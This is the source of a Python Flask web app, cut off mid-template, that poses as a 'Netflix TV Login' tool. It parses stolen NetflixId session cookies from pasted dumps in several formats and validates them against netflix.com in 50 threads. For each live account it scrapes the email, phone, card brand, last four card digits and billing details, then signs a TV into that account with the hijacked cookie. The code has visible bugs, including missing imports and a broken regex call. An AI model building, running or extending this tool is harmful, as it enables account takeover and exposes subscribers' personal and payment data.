# app.py - Netflix TV Login Web Application with Full Account Details
# Run with: pip install flask flask-session requests beautifulsoup4 cryptography

import os
import re
import json
import time
import base64
import secrets
import uuid
import urllib.parse
import requests
import codecs
from datetime import datetime
from collections import defaultdict
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import Flask, render_template, request, jsonify, session, make_response, abort
from flask_session import Session
from werkzeug.middleware.proxy_fix import ProxyFix
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
import logging
from bs4 import BeautifulSoup

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

# -------------------------------------------------------------------
# APP INIT
# -------------------------------------------------------------------

app = Flask(__name__)
app.wsgi_app = ProxyFix(app.wsgi_app, x_for=1, x_proto=1)

# Configuration
app.config['SECRET_KEY'] = os.getenv('SECRET_KEY', secrets.token_hex(32))
app.config['SESSION_TYPE'] = 'filesystem'
app.config['SESSION_PERMANENT'] = False
app.config['SESSION_FILE_DIR'] = './flask_session'
app.config['PERMANENT_SESSION_LIFETIME'] = 3600
Session(app)

# Ensure session directory exists
os.makedirs('./flask_session', exist_ok=True)

# -------------------------------------------------------------------
# RATE LIMIT - 5 REQUESTS PER MINUTE = HONEYPOT
# -------------------------------------------------------------------

RATE_LIMIT = 5
RATE_WINDOW = 60  # 60 seconds

# Trackers for each endpoint
extract_requests = defaultdict(list)
check_requests = defaultdict(list)
login_requests = defaultdict(list)

# -------------------------------------------------------------------
# VULGAR HONEYPOT RESPONSES (RANDOMIZED)
# -------------------------------------------------------------------

HONEYPOT_RESPONSES = [
    "nice try, bot 🤡",
    "lol no",
    "🖕",
    "begone thot",
    "💀",
    "cope harder",
    "touch grass",
    "imagine automating this 💀",
    "gfy",
    "🚫🤖",
    "u thought",
    "L + ratio",
    "stay mad",
    "lmao get real",
    "script kiddie detected",
    "🍼 here's your bottle",
    "who let u cook",
    "bruh",
    "nah",
    "🚷",
    "try harder 💅",
    "skill issue",
    "bot behavior detected",
    "🤡🤡🤡",
    "rate limit says no",
    "slow down turbo",
    "fuck off",
    "no soup for you",
    "denied 🖕",
    "automation? denied.",
    "ur ip is getting roasted rn",
    "chill tf out",
    "5 per min. learn to count.",
    "this ain't it chief",
    "bro thought he was slick 💀",
    "error: intelligence not found",
    "try again after touching grass",
    "nah fam",
    "access denied, cry about it",
    "go automate your Ls somewhere else",
    "request rejected. ego shattered.",
    "your script smells like github copypasta",
    "bot detected, opinion discarded",
    "keep trying, it's funny",
    "this endpoint laughed at you",
    "denied harder than your last deploy",
    "not today satan",
    "404: skill not found",
    "you tried. poorly.",
    "go optimize deez nuts",
    "your bot just faceplanted",
    "blocked faster than your retry loop",
    "this ain't a vending machine",
    "wrong door, npc",
    "nope.exe",
    "request declined with prejudice",
    "malfunction detected between keyboard and chair",
    "cool script. shame about the limits.",
    "you must be new here",
    "rate limit > your entire operation",
    "keep hammering, I love the logs",
    "another one for the honeypot 😋",
    "thanks for the fingerprint",
    "ur cloud bill is crying",
    "automation detected, dignity revoked",
    "nah bro we good",
    "denied, logged, laughed at",
    "try again in your dreams",
    "this endpoint bites back",
    "you just trained my IDS",
    "congrats, you're in the dataset",
    "flagged, tagged, laughed at",
    "bro hit the wall",
    "not even close",
    "go home bot, you're drunk",
    "endpoint said: absolutely not",
    "security says hi 👋",
    "ur bot needs therapy",
    "nice IP, would be a shame if it stayed logged",
]

# -------------------------------------------------------------------
# SECURITY LIMITS
# -------------------------------------------------------------------

MAX_LOGIN_ATTEMPTS = 3
LOCKOUT_TIME = 300  # 5 minutes

# -------------------------------------------------------------------
# FAILED ATTEMPT TRACKING
# -------------------------------------------------------------------

failed_attempts = defaultdict(list)
locked_ips = {}

# -------------------------------------------------------------------
# RATE LIMIT CHECKER WITH HONEYPOT
# -------------------------------------------------------------------

def check_rate_limit(ip, tracker, limit=RATE_LIMIT, window=RATE_WINDOW):
    """Check rate limit for a specific tracker"""
    now = time.time()
    tracker[ip] = [t for t in tracker[ip] if now - t < window]
    
    if len(tracker[ip]) >= limit:
        return False
    
    tracker[ip].append(now)
    return True

def honeypot_response():
    """Return random vulgar honeypot response"""
    return secrets.choice(HONEYPOT_RESPONSES)

# -------------------------------------------------------------------
# LOCKOUT CHECKERS
# -------------------------------------------------------------------

def check_lock(ip):
    if ip in locked_ips and time.time() < locked_ips[ip]:
        abort(403, "Access denied")

def record_fail(ip):
    now = time.time()
    failed_attempts[ip] = [t for t in failed_attempts[ip] if now - t < LOCKOUT_TIME]
    failed_attempts[ip].append(now)
    if len(failed_attempts[ip]) >= MAX_LOGIN_ATTEMPTS:
        locked_ips[ip] = now + LOCKOUT_TIME

def reset_fail(ip):
    failed_attempts[ip] = []
    locked_ips.pop(ip, None)

# -------------------------------------------------------------------
# ENCRYPTOR - AES-GCM
# -------------------------------------------------------------------

class SimpleEncryptor:
    """AES-256-GCM - no master key needed"""
    
    def encrypt(self, value: str) -> str:
        key = secrets.token_bytes(32)
        nonce = secrets.token_bytes(12)
        session_id = str(uuid.uuid4())
        expires = int(time.time()) + 3600  # 1 hour expiry

        payload = {
            "v": value,
            "s": session_id,
            "e": expires
        }

        ciphertext = AESGCM(key).encrypt(
            nonce,
            json.dumps(payload).encode(),
            None
        )

        return base64.urlsafe_b64encode(json.dumps([
            base64.b64encode(key).decode(),
            base64.b64encode(nonce).decode(),
            base64.b64encode(ciphertext).decode(),
            expires,
            session_id
        ]).encode()).decode()

    def decrypt(self, token: str) -> str:
        try:
            blob = json.loads(base64.urlsafe_b64decode(token).decode())
            key = base64.b64decode(blob[0])
            nonce = base64.b64decode(blob[1])
            ciphertext = base64.b64decode(blob[2])
            expires = blob[3]

            if time.time() > expires:
                abort(400, "Invalid request")

            plaintext = AESGCM(key).decrypt(nonce, ciphertext, None)
            return json.loads(plaintext.decode())["v"]
            
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            abort(400, "Invalid request")

encryptor = SimpleEncryptor()

# -------------------------------------------------------------------
# NETFLIX HELPER FUNCTIONS (from your code)
# -------------------------------------------------------------------

def unescape_plan(s):
    """Unescape plan string"""
    try:
        return codecs.decode(s, 'unicode_escape')
    except Exception:
        return s

def extract_netflix_id(content):
    """Extract single NetflixId from content"""
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId" and cookie.get("name") != "SecureNetflixId":
                    return cookie.get("value")
        elif isinstance(data, dict):
            if "NetflixId" in data and "SecureNetflixId" not in data:
                return data["NetflixId"]
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId" and cookie.get("name") != "SecureNetflixId":
                        return cookie.get("value")
    except:
        pass
    
    # New format
    new_format_match = re.search(r'Cookies\s*=\s*NetflixId=([^\s|]+)', content)
    if new_format_match:
        netflix_id = new_format_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    # Standard formats
    netflix_id_match = re.search(r'(?<!\wSecure)NetflixId=([^;,\s]+)', content)
    if netflix_id_match:
        netflix_id = netflix_id_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    netflix_id_alt_match = re.search(r'(?<!\bSecure)NetflixId=([^;,\s]+)', content)
    if netflix_id_alt_match:
        netflix_id = netflix_id_alt_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    # Netscape format
    netscape_match = re.search(r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s]+)', content)
    if netscape_match:
        netflix_id = netscape_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    # Plain text
    plain_match = re.search(r'(?<!\bSecure)NetflixId[=:\s]+([^\s;,\n]+)', content, re.IGNORECASE)
    if plain_match:
        netflix_id = plain_match.group(1)
        if '%' in netflix_id:
            try:
                netflix_id = urllib.parse.unquote(netflix_id)
            except:
                pass
        return netflix_id
    
    return None

def extract_multiple_netflix_ids(content):
    """Extract multiple NetflixIds from content"""
    netflix_ids = []
    
    # Try JSON array format first
    try:
        data = json.loads(content)
        if isinstance(data, list):
            for cookie in data:
                if cookie.get("name") == "NetflixId" and cookie.get("name") != "SecureNetflixId":
                    netflix_ids.append(cookie.get("value"))
        elif isinstance(data, dict):
            if "NetflixId" in data and "SecureNetflixId" not in data:
                netflix_ids.append(data["NetflixId"])
            elif "cookies" in data:
                for cookie in data["cookies"]:
                    if cookie.get("name") == "NetflixId" and cookie.get("name") != "SecureNetflixId":
                        netflix_ids.append(cookie.get("value"))
        if netflix_ids:
            return netflix_ids
    except:
        pass
    
    # Pattern-based extraction
    patterns = [
        r'Cookies\s*=\s*NetflixId=([^\s|]+)',
        r'(?<!\wSecure)NetflixId=([^;,\s\n]+)',
        r'\.netflix\.com\s+TRUE\s+/\s+TRUE\s+\d+\s+NetflixId\s+([^\s\n]+)',
        r'(?<!\bSecure)NetflixId[=:\s]+([^\s;,\n]+)'
    ]
    
    for pattern in patterns:
        matches = re.findall(pattern, content, re.IGNORECASE)
        for match in matches:
            netflix_id = match
            if '%' in netflix_id:
                try:
                    netflix_id = urllib.parse.unquote(netflix_id)
                except:
                    pass
            if netflix_id and netflix_id not in netflix_ids:
                netflix_ids.append(netflix_id)
    
    # Filter out SecureNetflixId
    filtered_ids = []
    for netflix_id in netflix_ids:
        if not any(secure_indicator in content for secure_indicator in ['SecureNetflixId', 'securenetflixid']):
            filtered_ids.append(netflix_id)
    
    return filtered_ids

def extract_profiles_from_manage_profiles(response_text):
    """Extract profile names from ManageProfiles page"""
    profiles = []
    try:
        profiles_match = re.search(r'"profiles"\s*:\s*({[^}]+})', response_text)
        if profiles_match:
            profiles_json_str = profiles_match.group(1)
            
            def unescape_hex(match):
                hex_code = match.group(1)
                try:
                    return chr(int(hex_code, 16))
                except:
                    return match.group(0)
            
            cleaned_json = re.sub(r'\\x([0-9a-fA-F]{2})', unescape_hex, profiles_json_str)
            profiles_data = json.loads(f'{{{cleaned_json}}}')
            
            for profile_id, profile_data in profiles_data.items():
                if isinstance(profile_data, dict):
                    summary = profile_data.get('summary', {})
                    if isinstance(summary, dict):
                        value = summary.get('value', {})
                        if isinstance(value, dict):
                            profile_name = value.get('profileName')
                            if profile_name:
                                profiles.append(profile_name)
    except json.JSONDecodeError:
        try:
            profile_matches = re.findall(r'"profileName"\s*:\s*"([^"]+)"', response_text)
            for profile in profile_matches:
                profile = re.sub(r'\\x([0-9a-fA-F]{2})', lambda m: chr(int(m.group(1), 16)), profile)
                profiles.append(profile)
        except:
            pass
    
    # Try BeautifulSoup if regex fails
    if not profiles:
        try:
            soup = BeautifulSoup(response_text, 'html.parser')
            profile_elements = soup.find_all('span', class_='profile-name')
            for elem in profile_elements:
                profile = elem.get_text().strip()
                if profile and profile not in profiles:
                    profiles.append(profile)
        except:
            pass
    
    return profiles

def check_cookie_sync(cookie_dict):
    """Synchronous cookie check function for threading"""
    session = requests.Session()
    session.cookies.update(cookie_dict)
    url = 'https://www.netflix.com/YourAccount'
    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0'}
    
    try:
        resp = session.get(url, headers=headers, timeout=25)
        txt = resp.text
        
        if '"mode":"login"' in txt:
            return {'ok': False, 'err': 'Invalid cookie (login page detected)', 'cookie': cookie_dict}
        
        if '"mode":"yourAccount"' not in txt:
            return {'ok': False, 'err': 'Invalid cookie (not logged in)', 'cookie': cookie_dict}

        def find(pattern):
            m = re.search(pattern, txt)
            return m.group(1) if m else None

        def find_list(pattern):
            return re.findall(pattern, txt)
        
        name = find(r'"userInfo":\{"data":\{"name":"([^"]+)"')
        if name:
            name = name.replace("\\x20", " ")
        else:
            name = "Unknown"
        
        country_code = find(r'"currentCountry":"([^"]+)"') or find(r'"countryCode":"([^"]+)"')
        country = country_code if country_code else "Unknown"
        
        plan = find(r'localizedPlanName.{1,50}?value":"([^"]+)"')
        if not plan:
            plan = find(r'"planName"\s*:\s*"([^"]+)"')
        if plan:
            plan = plan.replace("\\x20", " ").replace("\\x28", " ").replace("\\x29", " ").replace("\\u0020", " ")
            plan = unescape_plan(plan)
        else:
            plan = "Unknown"

        plan_price = find(r'"planPrice":\{"fieldType":"String","value":"([^"]+)"')
        if plan_price:
            plan_price = unescape_plan(plan_price)
        else:
            plan_price = "Unknown"

        member_since = find(r'"memberSince":"([^"]+)"')
        if member_since:
            member_since = member_since.replace("\\x20", " ")
            member_since = unescape_plan(member_since)
        else:
            member_since = "Unknown"

        next_billing_date = find(r'"nextBillingDate":\{"fieldType":"String","value":"([^"]+)"')
        if next_billing_date:
            next_billing_date = next_billing_date.replace("\\x20", " ")
        else:
            next_billing_date = "Unknown"

        payment_method = find(r'"paymentMethod":\{"fieldType":"String","value":"([^"]+)"')
        if not payment_method:
            payment_method = "Unknown"

        card_brand = find_list(r'"paymentOptionLogo":"([^"]+)"')
        if not card_brand:
            card_brand = ["Unknown"]
        
        last4_digits = find_list(r'"GrowthCardPaymentMethod","displayText":"([^"]+)"')
        if not last4_digits:
            last4_digits = ["Unknown"]
        
        phone_match = re.search(r'"growthLocalizablePhoneNumber":\{.*?"phoneNumberDigits":\{.*?"value":"([^"]+)"', txt, re.DOTALL)
        if phone_match:
            phone = phone_match.group(1)
            phone = phone.replace("\\x2B", "+")
        else:
            phone = find(r'"phoneNumberDigits":\{"__typename":"GrowthClearStringValue","value":"([^"]+)"')
            if phone:
                phone = phone.replace("\\x2B", "+")
            else:
                phone = "Unknown"

        phone_verified_match = re.search(r'"growthLocalizablePhoneNumber":\{.*?"isVerified":(true|false)', txt, re.DOTALL)
        if phone_verified_match:
            phone_verified = "Yes" if phone_verified_match.group(1) == "true" else "No"
        else:
            phone_verified_match = re.search(r'"growthPhoneNumber":\{"__typename":"GrowthPhoneNumber","isVerified":(true|false)')
            if phone_verified_match:
                phone_verified = "Yes" if phone_verified_match.group(1) == "true" else "No"
            else:
                phone_verified = "Unknown"

        video_quality = find(r'"videoQuality":\{"fieldType":"String","value":"([^"]+)"')
        if not video_quality:
            video_quality = "Unknown"

        max_streams = find(r'"maxStreams":\{"fieldType":"Numeric","value":([0-9]+)')
        if not max_streams:
            max_streams = "Unknown"

        payment_hold = find(r'"growthHoldMetadata":\{"__typename":"GrowthHoldMetadata","isUserOnHold":(true|false)')
        if payment_hold:
            payment_hold = "Yes" if payment_hold == "true" else "No"
        else:
            payment_hold = "Unknown"

        extra_member = find(r'"showExtraMemberSection":\{"fieldType":"Boolean","value":(true|false)')
        if extra_member:
            extra_member = "Yes" if extra_member == "true" else "No"
        else:
            extra_member = "Unknown"

        extra_member_slot_status = "Unknown"
        add_on_slots_match = re.search(r'"addOnSlots":\s*\{[^}]*"value":\s*\[\s*\{\s*"fieldType":\s*"Group",\s*"fieldGroup":\s*"AddOnSlot",\s*"fields":\s*\{\s*"slotState":\s*\{\s*"fieldType":\s*"String",\s*"value":\s*"([^"]+)"', txt, re.DOTALL)
        if add_on_slots_match:
            extra_member_slot_status = add_on_slots_match.group(1)
        
        email_verified_match = re.search(r'"growthEmail":\{.*?"isVerified":(true|false)', txt, re.DOTALL)
        if email_verified_match:
            email_verified = "Yes" if email_verified_match.group(1) == "true" else "No"
        else:
            email_verified_match = re.search(r'"emailVerified"\s*:\s*(true|false)', txt)
            if email_verified_match:
                email_verified = "Yes" if email_verified_match.group(1) == "true" else "No"
            else:
                email_verified = "Unknown"
        
        membership_status = find(r'"membershipStatus":"([^"]+)"')
        if not membership_status:
            membership_status = "Unknown"
        
        email_match = re.search(r'"growthEmail":\{.*?"email":\{.*?"value":"([^"]+)"', txt, re.DOTALL)
        if email_match:
            email = email_match.group(1)
            try:
                email = urllib.parse.unquote(email)
            except:
                pass
            email = email.replace('\\x40', '@')
        else:
            email = find(r'"emailAddress"\s*:\s*"([^"]+)"') or "Unknown"
            try:
                email = urllib.parse.unquote(email)
            except:
                pass
            email = email.replace('\\x40', '@')
        
        # Get profiles
        profiles = []
        try:
            resp_profiles = session.get("https://www.netflix.com/ManageProfiles", timeout=15)
            profiles = extract_profiles_from_manage_profiles(resp_profiles.text)
        except Exception as e:
            logger.error(f"Error extracting profiles: {e}")
        
        profiles_str = ", ".join(profiles) if profiles else "No profiles"
        connected_profiles_count = len(profiles) if profiles else 0

        status = re.search(r'"membershipStatus":\s*"([^"]+)"', txt)
        is_premium = bool(status and status.group(1) == 'CURRENT_MEMBER')
        is_valid = bool(status)
        if not is_valid and "NetflixId" in cookie_dict and "SecureNetflixId" not in cookie_dict:
            is_valid = "Account & Billing" in txt or 'membershipStatus' in txt
            is_premium = is_valid
        
        netflix_id = cookie_dict.get('NetflixId', '')
        try:
            encoded_cookie = f"NetflixId={urllib.parse.quote(netflix_id, safe='')}"
        except:
            encoded_cookie = f"NetflixId={netflix_id}"

        return {
            'ok': is_valid, 
            'premium': is_premium, 
            'name': name, 
            'country': country, 
            'plan': plan, 
            'plan_price': plan_price, 
            'member_since': member_since, 
            'next_billing_date': next_billing_date, 
            'payment_method': payment_method, 
            'card_brand': card_brand, 
            'last4_digits': last4_digits, 
            'phone': phone, 
            'phone_verified': phone_verified, 
            'video_quality': video_quality, 
            'max_streams': max_streams, 
            'on_payment_hold': payment_hold, 
            'extra_member': extra_member, 
            'extra_member_slot_status': extra_member_slot_status, 
            'email_verified': email_verified, 
            'membership_status': membership_status, 
            'connected_profiles': connected_profiles_count, 
            'email': email, 
            'profiles': profiles_str, 
            'cookie': cookie_dict, 
            'cookie_string': encoded_cookie
        }
    except requests.exceptions.Timeout:
        return {'ok': False, 'err': 'Request timeout', 'cookie': cookie_dict}
    except requests.exceptions.ConnectionError:
        return {'ok': False, 'err': 'Connection error', 'cookie': cookie_dict}
    except Exception as e:
        logger.error(f"Error checking cookie: {e}")
        return {'ok': False, 'err': str(e), 'cookie': cookie_dict}

def check_multiple_cookies_threaded(cookie_dicts, max_workers=50):
    """Check multiple cookies using thread pool (50 threads)"""
    results = []
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        future_to_cookie = {executor.submit(check_cookie_sync, cookie_dict): cookie_dict 
                           for cookie_dict in cookie_dicts}
        
        for future in as_completed(future_to_cookie):
            try:
                result = future.result(timeout=30)
                results.append(result)
            except Exception as e:
                cookie_dict = future_to_cookie[future]
                logger.error(f"Thread error: {e}")
                results.append({'ok': False, 'err': str(e), 'cookie': cookie_dict})
    
    return results

async def check_netflix_cookie(cookie_dict):
    """Async wrapper for sync function"""
    return await asyncio.to_thread(check_cookie_sync, cookie_dict)

def extract_auth_url(session):
    """Extract authURL for TV login"""
    try:
        response = session.get('https://www.netflix.com/account', timeout=10)
        text = response.text
        auth_match = re.search(r'"authURL":"([^"]+)"', text)
        if auth_match:
            auth_url = auth_match.group(1)
            return auth_url.replace('\\x2F', '/').replace('\\x3D', '=')
    except Exception as e:
        logger.error(f"Error extracting authURL: {e}")
    return None

def perform_tv_login(session, auth_url, tv_code):
    """Perform TV login with code"""
    try:
        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'content-type': 'application/x-www-form-urlencoded',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
            'origin': 'https://www.netflix.com',
            'referer': 'https://www.netflix.com/account'
        }
        
        data = {
            'flow': 'websiteSignUp',
            'authURL': auth_url,
            'flowMode': 'enterTvLoginRendezvousCode',
            'withFields': 'tvLoginRendezvousCode,isTvUrl2',
            'code': tv_code,
            'tvLoginRendezvousCode': tv_code,
            'isTvUrl2': 'true',
            'action': 'nextAction'
        }
        
        response = session.post('https://www.netflix.com/tv2', headers=headers, data=data, allow_redirects=False, timeout=15)
        
        if response.status_code == 302 and response.headers.get('location') == 'https://www.netflix.com/tv/out/success':
            return {'success': True, 'message': 'TV login successful!'}
        elif "That code wasn't right" in response.text:
            return {'success': False, 'message': 'Invalid TV code. Please check and try again.'}
        else:
            return {'success': False, 'message': 'TV login failed. Please try again.'}
            
    except requests.exceptions.Timeout:
        return {'success': False, 'message': 'Request timeout. Please try again.'}
    except Exception as e:
        logger.error(f"TV login error: {e}")
        return {'success': False, 'message': f'Error: {str(e)}'}

# -------------------------------------------------------------------
# BEFORE REQUEST - LOCK CHECK
# -------------------------------------------------------------------

@app.before_request
def guard():
    ip = request.remote_addr or "unknown"
    check_lock(ip)

# -------------------------------------------------------------------
# ROUTES
# -------------------------------------------------------------------

@app.route('/')
def index():
    """Serve the main HTML page"""
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/extract', methods=['POST'])
def api_extract():
    """Extract NetflixIds from content - 5/min limit"""
    ip = request.remote_addr or "unknown"
    
    # Rate limit check
    if not check_rate_limit(ip, extract_requests):
        response = make_response(jsonify({
            "honeypot": True,
            "message": honeypot_response()
        }), 429)
        response.headers["X-RateLimit-Limit"] = str(RATE_LIMIT)
        response.headers["X-RateLimit-Window"] = f"{RATE_WINDOW}s"
        return response
    
    data = request.get_json(silent=True) or {}
    content = data.get('content', '')
    
    if not content:
        return jsonify({'success': False, 'error': 'No content provided'})
    
    netflix_ids = extract_multiple_netflix_ids(content)
    
    if not netflix_ids:
        # Try single extraction
        single_id = extract_netflix_id(content)
        if single_id:
            netflix_ids = [single_id]
    
    if not netflix_ids:
        return jsonify({'success': False, 'error': 'No Netflix cookies found'})
    
    # Encrypt the IDs for response
    encrypted_ids = []
    for nid in netflix_ids[:10]:  # Limit to 10
        encrypted_ids.append(encryptor.encrypt(nid))
    
    response = jsonify({
        'success': True,
        'netflix_ids': encrypted_ids,
        'count': len(netflix_ids)
    })
    
    response.headers["X-RateLimit-Remaining"] = str(RATE_LIMIT - len(extract_requests[ip]))
    return response

@app.route('/api/check', methods=['POST'])
def api_check():
    """Check Netflix accounts using 50 threads - 5/min limit"""
    ip = request.remote_addr or "unknown"
    
    # Rate limit check
    if not check_rate_limit(ip, check_requests):
        response = make_response(jsonify({
            "honeypot": True,
            "message": honeypot_response()
        }), 429)
        response.headers["X-RateLimit-Limit"] = str(RATE_LIMIT)
        response.headers["X-RateLimit-Window"] = f"{RATE_WINDOW}s"
        return response
    
    data = request.get_json(silent=True) or {}
    encrypted_ids = data.get('netflix_ids', [])
    
    if not encrypted_ids:
        return jsonify({'success': False, 'error': 'No Netflix IDs provided'})
    
    # Decrypt IDs
    cookie_dicts = []
    for encrypted_id in encrypted_ids[:10]:  # Limit to 10
        try:
            netflix_id = encryptor.decrypt(encrypted_id)
            cookie_dicts.append({'NetflixId': netflix_id})
        except Exception as e:
            logger.error(f"Decryption error: {e}")
            continue
    
    if not cookie_dicts:
        return jsonify({'success': False, 'error': 'Invalid encrypted IDs'})
    
    # Check cookies using 50 threads
    check_results = check_multiple_cookies_threaded(cookie_dicts, max_workers=50)
    
    results = []
    session_id = str(uuid.uuid4())
    
    for i, result in enumerate(check_results):
        if result.get('ok'):
            # Encrypt the Netflix ID for later use
            netflix_id = result['cookie'].get('NetflixId', '')
            encrypted_for_login = encryptor.encrypt(netflix_id)
            
            # Format account info for display
            account_info = {
                'id': i,
                'name': result.get('name', 'Unknown'),
                'email': result.get('email', 'Unknown'),
                'country': result.get('country', 'Unknown'),
                'plan': result.get('plan', 'Unknown'),
                'plan_price': result.get('plan_price', 'Unknown'),
                'member_since': result.get('member_since', 'Unknown'),
                'next_billing': result.get('next_billing_date', 'Unknown'),
                'payment_method': result.get('payment_method', 'Unknown'),
                'card_brand': result.get('card_brand', ['Unknown'])[0] if result.get('card_brand') else 'Unknown',
                'last4': result.get('last4_digits', ['Unknown'])[0] if result.get('last4_digits') else 'Unknown',
                'phone': result.get('phone', 'Unknown'),
                'phone_verified': result.get('phone_verified', 'Unknown'),
                'video_quality': result.get('video_quality', 'Unknown'),
                'max_streams': result.get('max_streams', 'Unknown'),
                'payment_hold': result.get('on_payment_hold', 'Unknown'),
                'extra_member': result.get('extra_member', 'Unknown'),
                'email_verified': result.get('email_verified', 'Unknown'),
                'membership_status': result.get('membership_status', 'Unknown'),
                'profiles_count': result.get('connected_profiles', 0),
                'profiles': result.get('profiles', 'No profiles'),
                'premium': result.get('premium', False),
                'valid': True,
                'encrypted_id': encrypted_for_login,
                'session_id': session_id
            }
            results.append(account_info)
        else:
            results.append({
                'id': i,
                'valid': False,
                'error': result.get('err', 'Invalid cookie')
            })
    
    valid_count = sum(1 for r in results if r.get('valid'))
    
    response = jsonify({
        'success': True,
        'results': results,
        'valid_count': valid_count,
        'total_count': len(results),
        'session_id': session_id
    })
    
    response.headers["X-RateLimit-Remaining"] = str(RATE_LIMIT - len(check_requests[ip]))
    return response

@app.route('/api/login', methods=['POST'])
def api_login():
    """Login to TV - 5/min limit"""
    ip = request.remote_addr or "unknown"
    
    # Rate limit check
    if not check_rate_limit(ip, login_requests):
        response = make_response(jsonify({
            "honeypot": True,
            "message": honeypot_response()
        }), 429)
        response.headers["X-RateLimit-Limit"] = str(RATE_LIMIT)
        response.headers["X-RateLimit-Window"] = f"{RATE_WINDOW}s"
        return response
    
    data = request.get_json(silent=True) or {}
    encrypted_id = data.get('encrypted_id')
    tv_code = data.get('tv_code', '').strip()
    session_id = data.get('session_id')
    
    if not encrypted_id or not tv_code or not session_id:
        return jsonify({'success': False, 'error': 'Missing required parameters'})
    
    # Validate TV code
    if not re.match(r'^\d{8}$', tv_code):
        return jsonify({'success': False, 'error': 'TV code must be 8 digits'})
    
    try:
        # Decrypt Netflix ID
        netflix_id = encryptor.decrypt(encrypted_id)
        
        # Create session for TV login
        netflix_session = requests.Session()
        netflix_session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0'
        })
        netflix_session.cookies.update({'NetflixId': netflix_id})
        
        # Get authURL
        auth_url = extract_auth_url(netflix_session)
        if not auth_url:
            return jsonify({'success': False, 'error': 'Failed to get authURL. Cookie may be invalid.'})
        
        # Perform TV login
        result = perform_tv_login(netflix_session, auth_url, tv_code)
        
        response = jsonify(result)
        response.headers["X-RateLimit-Remaining"] = str(RATE_LIMIT - len(login_requests[ip]))
        return response
        
    except Exception as e:
        logger.error(f"Login error: {e}")
        return jsonify({'success': False, 'error': 'Login failed'})

@app.route('/api/health')
def health():
    return "OK"

# -------------------------------------------------------------------
# HTML TEMPLATE with Cool UI and Full Account Details
# -------------------------------------------------------------------

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix TV Login · Premium Account Tool</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 10% 20%, rgba(229, 9, 20, 0.15) 0%, transparent 30%),
                        radial-gradient(circle at 90% 80%, rgba(229, 9, 20, 0.1) 0%, transparent 30%),
                        linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            color: #ffffff;
            min-height: 100vh;
            line-height: 1.5;
            padding: 1.5rem;
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
        }

        /* Header */
        .header {
            text-align: center;
            margin-bottom: 2rem;
            position: relative;
        }

        .logo {
            font-size: 3.5rem;
            font-weight: 800;
            background: linear-gradient(135deg, #E50914 0%, #ff5e5e 100%);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 0.5rem;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 1rem;
            text-shadow: 0 0 30px rgba(229, 9, 20, 0.3);
        }

        .logo i {
            background: linear-gradient(135deg, #E50914, #ff5e5e);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            filter: drop-shadow(0 0 15px rgba(229, 9, 20, 0.5));
        }

        .subtitle {
            color: #9ca3af;
            font-size: 1.1rem;
            margin-bottom: 1rem;
        }

        .credit {
            display: inline-block;
            background: rgba(229, 9, 20, 0.1);
            color: #E50914;
            padding: 0.5rem 1.5rem;
            border-radius: 40px;
            font-size: 0.9rem;
            font-weight: 500;
            border: 1px solid rgba(229, 9, 20, 0.3);
            backdrop-filter: blur(10px);
            margin-top: 0.5rem;
        }

        .credit i {
            margin-right: 0.5rem;
        }

        .credit a {
            color: #E50914;
            text-decoration: none;
            font-weight: 600;
        }

        .credit a:hover {
            text-decoration: underline;
        }

        .rate-badge {
            background: rgba(0, 0, 0, 0.5);
            backdrop-filter: blur(10px);
            color: #ffd700;
            padding: 0.5rem 1.5rem;
            border-radius: 40px;
            font-size: 0.85rem;
            display: inline-flex;
            align-items: center;
            gap: 0.5rem;
            margin-top: 1rem;
            border: 1px solid rgba(255, 215, 0, 0.3);
        }

        /* Main Card */
        .main-card {
            background: rgba(20, 20, 20, 0.8);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(255, 255, 255, 0.1);
            border-radius: 32px;
            padding: 2rem;
            margin-bottom: 2rem;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.5);
        }

        .card-header {
            display: flex;
            align-items: center;
            gap: 1rem;
            margin-bottom: 2rem;
            padding-bottom: 1rem;
